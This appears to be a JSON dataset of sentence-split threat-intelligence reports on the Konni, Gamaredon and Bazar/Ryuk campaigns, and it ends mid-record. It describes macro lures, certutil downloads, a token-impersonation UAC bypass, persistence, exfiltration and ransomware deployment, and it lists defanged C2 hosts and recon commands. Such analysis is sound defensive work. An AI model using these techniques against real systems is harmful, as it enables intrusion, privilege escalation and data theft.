[
    {
        "id": "cti_reports_filtered/r-3.md:::S0",
        "text": "In mid-July 2019 I encountered with an emerging campaign delivering the Konni malware.",
        "type": "",
        "report": "r-3",
        "line": 0,
        "index": 0
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S1",
        "text": "The threat actor behind the campaign leveraged a malicious macro-armed Microsoft Word document titled: \u201c\u041e \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u0438 \u043d\u0430 \u041a\u043e\u0440\u0435\u0439\u0441\u043a\u043e\u043c \u043f\u043e\u043b\u0443\u043e\u0441\u0442\u0440\u043e\u0432\u0435 \u0438 \u043f\u0435\u0440\u0441\u043f\u0435\u043a\u0442\u0438\u0432\u0430\u0445 \u0434\u0438\u0430\u043b\u043e\u0433\u0430 \u043c\u0435\u0436\u0434\u0443 \u0421\u0428\u0410 \u0438 \u041a\u041d\u0414\u0420\u201d (translated to: About the situation on the Korean Peninsula and the prospect of a dialogue between the United States and the DPRK).",
        "type": "",
        "report": "r-3",
        "line": 1,
        "index": 1
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S2",
        "text": "Unlike the previously observed campaign, the August campaign potentially targeting Russian language speakers with an interest in Korean Geo-political situation, the lure document used in this campaign is written Cyrillic and contains content related to North Korean American foreign affairs.",
        "type": "",
        "report": "r-3",
        "line": 2,
        "index": 2
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S3",
        "text": "When analyzing the document, we see that the internal codepage of the lure document is 949 \u2014 ANSI/OEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout.",
        "type": "",
        "report": "r-3",
        "line": 3,
        "index": 3
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S4",
        "text": "This is an indication that the author is a Korean native speaker.\n",
        "type": "",
        "report": "r-3",
        "line": 4,
        "index": 4
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S5",
        "text": "The lure document contains VBA macro code with the following capabilities:\n",
        "type": "",
        "report": "r-3",
        "line": 5,
        "index": 5
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S6",
        "text": "- Changes the font color from light grey to black \u2014 to trick the victim to enable content.\n",
        "type": "",
        "report": "r-3",
        "line": 6,
        "index": 6
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S7",
        "text": "- Checks if windows is a 32 or 64 bit version.\n",
        "type": "",
        "report": "r-3",
        "line": 7,
        "index": 7
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S8",
        "text": "- Constructs and executes the command-line to download additional files\n",
        "type": "",
        "report": "r-3",
        "line": 8,
        "index": 8
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S9",
        "text": "The document contains 3 hidden text boxes. \n",
        "type": "",
        "report": "r-3",
        "line": 9,
        "index": 9
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S10",
        "text": "Each text box has a hexadecimal string constructed to a command that is executed once the document is opened by the victim.",
        "type": "",
        "report": "r-3",
        "line": 10,
        "index": 10
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S11",
        "text": "Certutil is a living-off the land command line utility that can be used to obtain certificate authority information and configure certificate services.",
        "type": "",
        "report": "r-3",
        "line": 11,
        "index": 11
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S12",
        "text": "Threat actors usually utilize certutil to download remote files from a given URL. \n",
        "type": "",
        "report": "r-3",
        "line": 12,
        "index": 12
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S13",
        "text": "It also incorporates a built-in function to decode base64-encoded files.\n",
        "type": "",
        "report": "r-3",
        "line": 13,
        "index": 13
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S14",
        "text": "CMD silently copies certutil.exe into temp directory and rename it to \u201cmx.exe\u201d in an attempt to evade detection and then downloads 1.txt from from a remote resource: http://handicap.eu5[.]org. \n",
        "type": "",
        "report": "r-3",
        "line": 14,
        "index": 14
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S15",
        "text": "The text file contains a base64 encoded string that is decoded by certutil and saved as 1.bat.\n",
        "type": "",
        "report": "r-3",
        "line": 15,
        "index": 15
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S16",
        "text": "The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.\n",
        "type": "",
        "report": "r-3",
        "line": 16,
        "index": 16
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S17",
        "text": "The batch script acts as a second stage downloader and downloads two additional files, depending on the system architecture.",
        "type": "",
        "report": "r-3",
        "line": 17,
        "index": 17
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S18",
        "text": "Certutil is executed to download a txt file and decode its content.",
        "type": "",
        "report": "r-3",
        "line": 18,
        "index": 18
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S19",
        "text": "Decoding each base64 string (32-bit or 64-bit version) results in a cabinet file \u2014 setup.cab\n",
        "type": "",
        "report": "r-3",
        "line": 19,
        "index": 19
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S20",
        "text": "The content of the cabinet file is then extracted into %temp% folder, and setup.cab file is deleted from the system.\n",
        "type": "",
        "report": "r-3",
        "line": 20,
        "index": 20
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S21",
        "text": "Install.bat \u2014 acts as installer to ensure persistence and execute mshlpsrvc.dll.\n",
        "type": "",
        "report": "r-3",
        "line": 21,
        "index": 21
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S22",
        "text": "mshlpweb.dll \u2014 acts as loader; responsible to elevate privileges.",
        "type": "",
        "report": "r-3",
        "line": 22,
        "index": 22
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S23",
        "text": "mshlpsrvc.dll \u2014 final payload; responsible for data exfiltration.\n",
        "type": "",
        "report": "r-3",
        "line": 23,
        "index": 23
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S24",
        "text": "mshlpsrvc.ini \u2014 configuration file; contains URL used by mshlpsrvc.dll\n",
        "type": "",
        "report": "r-3",
        "line": 24,
        "index": 24
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S25",
        "text": "Both dropped DLL files are unsigned and packed with UPX packer.\n",
        "type": "",
        "report": "r-3",
        "line": 25,
        "index": 25
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S26",
        "text": "To check level of permissions, the threat actor uses net.exe.",
        "type": "",
        "report": "r-3",
        "line": 26,
        "index": 26
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S27",
        "text": "if the current user has high privileges, install.bat is executed directly.",
        "type": "",
        "report": "r-3",
        "line": 27,
        "index": 27
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S28",
        "text": "Otherwise, mshlpweb.dll is executed using rundll32.exe.",
        "type": "",
        "report": "r-3",
        "line": 28,
        "index": 28
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S29",
        "text": "mshlpweb.dll is a loader that uses a known token impersonation technique to elevate permissions and execute install.bat with high privileges.",
        "type": "",
        "report": "r-3",
        "line": 29,
        "index": 29
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S30",
        "text": "To gain higher privileges mshlpweb.dll execute the Windows Update Standalone Installer, wusa.exe.",
        "type": "",
        "report": "r-3",
        "line": 30,
        "index": 30
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S31",
        "text": "This process runs as a high-integrity process by default, since its set to auto-elevate within its manifest.",
        "type": "",
        "report": "r-3",
        "line": 31,
        "index": 31
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S32",
        "text": "mshlpweb.dll contains an access token impersonation routine that duplicates the token of the high integrity instance of wusa.exe, and uses it to create a new cmd.exe process running under the security context of the impersonated user[2], which in turn execute the installer \u2014 install.bat.\n",
        "type": "",
        "report": "r-3",
        "line": 32,
        "index": 32
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S33",
        "text": "mshlpweb.dll utilize a set of standard windows API calls to duplicate the token of wusa.exe and use it to spawn high integrity instance of cmd.exe.",
        "type": "",
        "report": "r-3",
        "line": 33,
        "index": 33
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S34",
        "text": "Higher privileges are needed to execute the installer, install.bat.",
        "type": "",
        "report": "r-3",
        "line": 34,
        "index": 34
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S35",
        "text": "The technique used by the threat actor is a full fileless UAC bypass named \u201cCavalry\u201d that was leaked back in March 2017 to WikiLeaks as part of \u201cVault 7\u201d, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [3].",
        "type": "",
        "report": "r-3",
        "line": 35,
        "index": 35
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S36",
        "text": "This technique also bypasses UAC with the \u201cAlwaysNotify\u201d settings.",
        "type": "",
        "report": "r-3",
        "line": 36,
        "index": 36
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S37",
        "text": "Technique flow:\n",
        "type": "",
        "report": "r-3",
        "line": 37,
        "index": 37
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S38",
        "text": "- wusa.exe is executed in hidden window using ShellExecuteExW;\n",
        "type": "",
        "report": "r-3",
        "line": 38,
        "index": 38
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S39",
        "text": "- Handle to the access token associated with wusa.exe is created.\n",
        "type": "",
        "report": "r-3",
        "line": 39,
        "index": 39
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S40",
        "text": "- The token object of wusa.exe is duplicated using DuplicateTokenEx.",
        "type": "",
        "report": "r-3",
        "line": 40,
        "index": 40
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S41",
        "text": "The threat actor pass \u201cToken_all_access\u201d as desired access, which combines all possible access rights for a token and creates a new impersonation token.\n",
        "type": "",
        "report": "r-3",
        "line": 41,
        "index": 41
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S42",
        "text": "New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.\n",
        "type": "",
        "report": "r-3",
        "line": 42,
        "index": 42
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S43",
        "text": "Restricted token is then created and duplicated using NtFilterToken and DuplicateTokenEx respectively.\n",
        "type": "",
        "report": "r-3",
        "line": 43,
        "index": 43
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S44",
        "text": "The new duplicated token is passed to ImpersonateLoggedOnUser.\n",
        "type": "",
        "report": "r-3",
        "line": 44,
        "index": 44
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S45",
        "text": "An elevated cmd instance is spawned using CreateProcessWithLogonW function.",
        "type": "",
        "report": "r-3",
        "line": 45,
        "index": 45
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S46",
        "text": "The credentials passed as arguments to the function (Username: aaa, Domain: bbb, Password: ccc) are identical to the credentials specified in the UAC bypass implementation by FuzzySecurity, UAC-TokenMagic [4]\n",
        "type": "",
        "report": "r-3",
        "line": 46,
        "index": 46
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S47",
        "text": "I used the James Forshaw\u2019s excellent blog [6] explaining in detail how to bypass UAC using the technique above.",
        "type": "",
        "report": "r-3",
        "line": 47,
        "index": 47
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S48",
        "text": "When the installer is executed, it first stops COMSysApp, a service that manages the configuration and tracking of Component Object Model (COM)-based components, using sc.exe utility.",
        "type": "",
        "report": "r-3",
        "line": 48,
        "index": 48
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S49",
        "text": "- COMSysApp service is first configured to autostart and the binpath of the service is set to svchost.exe.\n",
        "type": "",
        "report": "r-3",
        "line": 49,
        "index": 49
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S50",
        "text": "- COMSysApp service is added under the \u201cSvcHost\u201d key as a preliminary step to its execution in the context of svchost.exe.\n",
        "type": "",
        "report": "r-3",
        "line": 50,
        "index": 50
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S51",
        "text": "- The malicious DLL is added as a service DLL of COMSysApp.\n",
        "type": "",
        "report": "r-3",
        "line": 51,
        "index": 51
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S52",
        "text": "- COMSysApp service is restarted.\n",
        "type": "",
        "report": "r-3",
        "line": 52,
        "index": 52
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S53",
        "text": "Once COMSysApp service is restarted the malware is loaded in memory, and the batch file is removed from the infected system.",
        "type": "",
        "report": "r-3",
        "line": 53,
        "index": 53
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S54",
        "text": "The final payload (mshlpsrvc.dll), and its configuration file (mshlpsrvc.ini) are both copied into the system32 directory from the temp directory and then deleted.\n",
        "type": "",
        "report": "r-3",
        "line": 54,
        "index": 54
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S55",
        "text": "After ComSysApp service is restarted, a new instance of svchost.exe is spawned and loads the final payload mshlpsrvc.dll.",
        "type": "",
        "report": "r-3",
        "line": 55,
        "index": 55
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S56",
        "text": "mshlpsrvc.ini is a configuration file that was delivered together with mshlpsrv.dll in earlier stage of the attack.",
        "type": "",
        "report": "r-3",
        "line": 56,
        "index": 56
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S57",
        "text": "This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org/4.txt.\n",
        "type": "",
        "report": "r-3",
        "line": 57,
        "index": 57
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S58",
        "text": "Prior to execution of any recon command to gather information from the target machine, the default codepage of the console is changed to \u201c65001\u201d (utf-8)\n",
        "type": "",
        "report": "r-3",
        "line": 58,
        "index": 58
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S59",
        "text": "The following information is gathered from the affected machine and sent back to the control server:\n",
        "type": "",
        "report": "r-3",
        "line": 59,
        "index": 59
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S60",
        "text": "- System info using: cmd /c systeminfo >%temp%\\temp.ini\n",
        "type": "",
        "report": "r-3",
        "line": 60,
        "index": 60
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S61",
        "text": "- List of running process using: cmd /c tasklist >%temp%\\temp.ini\n",
        "type": "",
        "report": "r-3",
        "line": 61,
        "index": 61
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S62",
        "text": "- The temp.ini file is then compressed into a cabinet file and saved to C:\\Windows\\TEMP: cmd /c makecab \u201cC:\\Windows\\TEMP\\temp.ini\u201d \u201cC:\\Windows\\TEMP\\temp.cab\u201d\n",
        "type": "",
        "report": "r-3",
        "line": 62,
        "index": 62
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S63",
        "text": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "type": "",
        "report": "r-3",
        "line": 63,
        "index": 63
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S64",
        "text": "Following decoding, the file content appears to be the FTP credentials for the FTP service that acts as the command & control server for this attack.",
        "type": "",
        "report": "r-3",
        "line": 64,
        "index": 64
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S65",
        "text": "We\u2019ve observed similar past campaigns where free FTP services were used as the C2 for other Konni and Syscon variants, staring from October 2017.",
        "type": "",
        "report": "r-3",
        "line": 65,
        "index": 65
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S66",
        "text": "[5]\n",
        "type": "",
        "report": "r-3",
        "line": 66,
        "index": 66
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S67",
        "text": "The data is exfiltrated in the following way:\n",
        "type": "",
        "report": "r-3",
        "line": 67,
        "index": 67
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S68",
        "text": "- The temp.cab is base64 encoded with the same custom key used earlier.",
        "type": "",
        "report": "r-3",
        "line": 68,
        "index": 68
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S69",
        "text": "- Encoded temp.cab is copied to a post.txt under the directory C:\\Windows\\TEMP.\n",
        "type": "",
        "report": "r-3",
        "line": 69,
        "index": 69
    },
    {
        "id": "cti_reports_filtered/r-3.md:::S70",
        "text": "- files uploaded to the control server using \u201cstor\u201d command.",
        "type": "",
        "report": "r-3",
        "line": 70,
        "index": 70
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S0",
        "text": "The case we found arrived through a targeted email that contained a document file (in docx format).",
        "type": "",
        "report": "r-51",
        "line": 0,
        "index": 71
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S1",
        "text": "Opening document starts a template injection technique for loading the document template from the internet.",
        "type": "",
        "report": "r-51",
        "line": 1,
        "index": 72
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S2",
        "text": "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
        "type": "",
        "report": "r-51",
        "line": 2,
        "index": 73
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S3",
        "text": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "type": "",
        "report": "r-51",
        "line": 3,
        "index": 74
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S4",
        "text": "During the time of the analysis however, the C&C server was not accessible, which made us unable to get additional payloads.",
        "type": "",
        "report": "r-51",
        "line": 4,
        "index": 75
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S5",
        "text": "The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID T1193).",
        "type": "",
        "report": "r-51",
        "line": 5,
        "index": 76
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S6",
        "text": "One of them even had the subject \u201cCoronavirus (2019-nCoV).\u201d",
        "type": "",
        "report": "r-51",
        "line": 6,
        "index": 77
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S7",
        "text": "The use of socially relevant topics is a common practice for attackers who wish to make their emails and documents more tempting to open.",
        "type": "",
        "report": "r-51",
        "line": 7,
        "index": 78
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S8",
        "text": "The email that used the coronavirus-related subject came with an attached document file.",
        "type": "",
        "report": "r-51",
        "line": 8,
        "index": 79
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S9",
        "text": "Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).",
        "type": "",
        "report": "r-51",
        "line": 9,
        "index": 80
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S10",
        "text": "The downloaded document template (in dot format) could differ slightly depending on each download.",
        "type": "",
        "report": "r-51",
        "line": 10,
        "index": 81
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S11",
        "text": "However, its Exif info or metadata remains consistent and shares the following details:\n",
        "type": "",
        "report": "r-51",
        "line": 11,
        "index": 82
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S12",
        "text": "As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID T1064), which exports VBS (MITRE ATT&CK framework ID T1064) to execute itself.",
        "type": "",
        "report": "r-51",
        "line": 12,
        "index": 83
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S13",
        "text": "More specifically it drops \u201c%USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs,\u201d which is hardcoded in the macro, and then executed in \u201cwscript.exe //b %USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs.\u201d\n",
        "type": "",
        "report": "r-51",
        "line": 13,
        "index": 84
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S14",
        "text": "PlayList.vbs contains the obfuscated codes (MITRE ATT&CK framework ID T1140), which it executes after decrypting the obfuscations.",
        "type": "",
        "report": "r-51",
        "line": 14,
        "index": 85
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S15",
        "text": "This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.",
        "type": "",
        "report": "r-51",
        "line": 15,
        "index": 86
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S16",
        "text": "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts (MITRE ATT&CK framework ID T1060) \n",
        "type": "",
        "report": "r-51",
        "line": 16,
        "index": 87
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S17",
        "text": "Connect with \u201chxxp:// kristom[.]hopto[.]org /{computer name}_{hexadecimal volume serious number}/help_05_03[.]php\u201d (MITRE ATT&CK framework IDs T1043, T1071, T1082) \n",
        "type": "",
        "report": "r-51",
        "line": 17,
        "index": 88
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S18",
        "text": "If the downloaded file size in the first step exceeds 10,485 bytes, then the file is saved as \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d (MITRE ATT&CK framework ID T1105) \n",
        "type": "",
        "report": "r-51",
        "line": 18,
        "index": 89
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S19",
        "text": "Use XOR for the file saved from the second step, where ASCII code converted from its own hexadecimal volume serial number is used as the key.",
        "type": "",
        "report": "r-51",
        "line": 19,
        "index": 90
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S20",
        "text": "The decrypted result is saved as \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d (T1001)\n",
        "type": "",
        "report": "r-51",
        "line": 20,
        "index": 91
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S21",
        "text": "If the file size of \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d exceeds 4,485 bytes, it is executed.",
        "type": "",
        "report": "r-51",
        "line": 21,
        "index": 92
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S22",
        "text": "Both \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d and \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d are then deleted (MITRE ATT&CK framework ID T1107)",
        "type": "",
        "report": "r-51",
        "line": 22,
        "index": 93
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S23",
        "text": "The observed routines of this VBS closely follow the other reports published on Gamaredon, such as the one from SentinelOne.",
        "type": "",
        "report": "r-51",
        "line": 23,
        "index": 94
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S24",
        "text": "However, the macro generated VBS was obfuscated in this case, likely as an additional evasive tactic.\n",
        "type": "",
        "report": "r-51",
        "line": 24,
        "index": 95
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S25",
        "text": "Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker.",
        "type": "",
        "report": "r-51",
        "line": 25,
        "index": 96
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S26",
        "text": "Lines 53 and 54 in figure 6 are for closing those downloaded and decoded TXT and EXE files, which are variables defined right before the IF statement.",
        "type": "",
        "report": "r-51",
        "line": 26,
        "index": 97
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S27",
        "text": "If, however, these lines do not pass through this IF statement, an error would occur.",
        "type": "",
        "report": "r-51",
        "line": 27,
        "index": 98
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S28",
        "text": "It shows that this malware is not tested enough, and may still be under development.",
        "type": "",
        "report": "r-51",
        "line": 28,
        "index": 99
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S29",
        "text": "Our analysis found several URLs of the network destinations for both template injection and VBS.",
        "type": "",
        "report": "r-51",
        "line": 29,
        "index": 100
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S30",
        "text": "While resolving them to IP addresses to understand their attack bases, we also found that they were all linked to the following IP addresses.\n",
        "type": "",
        "report": "r-51",
        "line": 30,
        "index": 101
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S31",
        "text": "Network destination for template injection: 176[.]119[.]147[.]225\n",
        "type": "",
        "report": "r-51",
        "line": 31,
        "index": 102
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S32",
        "text": "Network destination for VBS: 176[.]57[.]215[.]115\n",
        "type": "",
        "report": "r-51",
        "line": 32,
        "index": 103
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S33",
        "text": "These IP addresses are from Russian hosting companies.",
        "type": "",
        "report": "r-51",
        "line": 33,
        "index": 104
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S34",
        "text": "Most likely, the attackers rented Virtual Private Server (VPS) as their attack base.",
        "type": "",
        "report": "r-51",
        "line": 34,
        "index": 105
    },
    {
        "id": "cti_reports_filtered/r-51.md:::S35",
        "text": "Their URL for VBS (shown below) likely includes the data when they conducted the attack.\n",
        "type": "",
        "report": "r-51",
        "line": 35,
        "index": 106
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S0",
        "text": "In this case, the actions began via a loader malware known as Bazar/Kegtap.",
        "type": "",
        "report": "r-62",
        "line": 0,
        "index": 107
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S1",
        "text": "Reports indicate an email delivery via malspam, which has been creeping up in volume over the month of September.",
        "type": "",
        "report": "r-62",
        "line": 1,
        "index": 108
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S2",
        "text": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
        "type": "",
        "report": "r-62",
        "line": 2,
        "index": 109
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S3",
        "text": "The initial goal of this activity was to run discovery using built in Windows utilities like nltest, net group, and the 3rd party utility AdFind.",
        "type": "",
        "report": "r-62",
        "line": 3,
        "index": 110
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S4",
        "text": "After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day.",
        "type": "",
        "report": "r-62",
        "line": 4,
        "index": 111
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S5",
        "text": "Again, the same tools were employed in the second round of discovery, plus Rubeus.",
        "type": "",
        "report": "r-62",
        "line": 5,
        "index": 112
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S6",
        "text": "This time the discovery collection was exfiltrated via FTP to a server hosted in Russia.",
        "type": "",
        "report": "r-62",
        "line": 6,
        "index": 113
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S7",
        "text": "Next, the threat actor began to move laterally.",
        "type": "",
        "report": "r-62",
        "line": 7,
        "index": 114
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S8",
        "text": "It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment.",
        "type": "",
        "report": "r-62",
        "line": 8,
        "index": 115
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S9",
        "text": "From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.",
        "type": "",
        "report": "r-62",
        "line": 9,
        "index": 116
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S10",
        "text": "After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise.",
        "type": "",
        "report": "r-62",
        "line": 10,
        "index": 117
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S11",
        "text": "In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.",
        "type": "",
        "report": "r-62",
        "line": 11,
        "index": 118
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S12",
        "text": "The server utilized for backups in the domain was targeted first for encryption, with some further preparation completed on the host.",
        "type": "",
        "report": "r-62",
        "line": 12,
        "index": 119
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S13",
        "text": "However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.\n",
        "type": "",
        "report": "r-62",
        "line": 13,
        "index": 120
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S14",
        "text": "At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller.",
        "type": "",
        "report": "r-62",
        "line": 14,
        "index": 121
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S15",
        "text": "In total, the campaign lasted 29 hours\u2013from initial execution of the Bazar, to domain wide ransomware.",
        "type": "",
        "report": "r-62",
        "line": 15,
        "index": 122
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S16",
        "text": "If a defender missed the first day of recon, they would have had a little over 3 hours to respond before being ransomed.",
        "type": "",
        "report": "r-62",
        "line": 16,
        "index": 123
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S17",
        "text": "The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.",
        "type": "",
        "report": "r-62",
        "line": 17,
        "index": 124
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S18",
        "text": "Initial delivery was via email with a link to the Bazar/Kegtap backdoor loader.",
        "type": "",
        "report": "r-62",
        "line": 18,
        "index": 125
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S19",
        "text": "We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.\n",
        "type": "",
        "report": "r-62",
        "line": 19,
        "index": 126
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S20",
        "text": "Service execution was used several times to execute scripts and executables during lateral movement.\n",
        "type": "",
        "report": "r-62",
        "line": 20,
        "index": 127
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S21",
        "text": "WMI was used as well in an attempt to execute dlls laterally.\n",
        "type": "",
        "report": "r-62",
        "line": 21,
        "index": 128
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S22",
        "text": "The threat actors also performed process injection.\n",
        "type": "",
        "report": "r-62",
        "line": 22,
        "index": 129
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S23",
        "text": "Disabling Windows Defender.\n",
        "type": "",
        "report": "r-62",
        "line": 23,
        "index": 130
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S24",
        "text": "AdFind and adf.bat were dropped and run minutes after Document-Preview.exe was executed.",
        "type": "",
        "report": "r-62",
        "line": 24,
        "index": 131
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S25",
        "text": "We\u2019ve seen adf.bat numerous times and you can read more about it here.",
        "type": "",
        "report": "r-62",
        "line": 25,
        "index": 132
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S26",
        "text": "The batch file outputs information into the following text files.\n",
        "type": "",
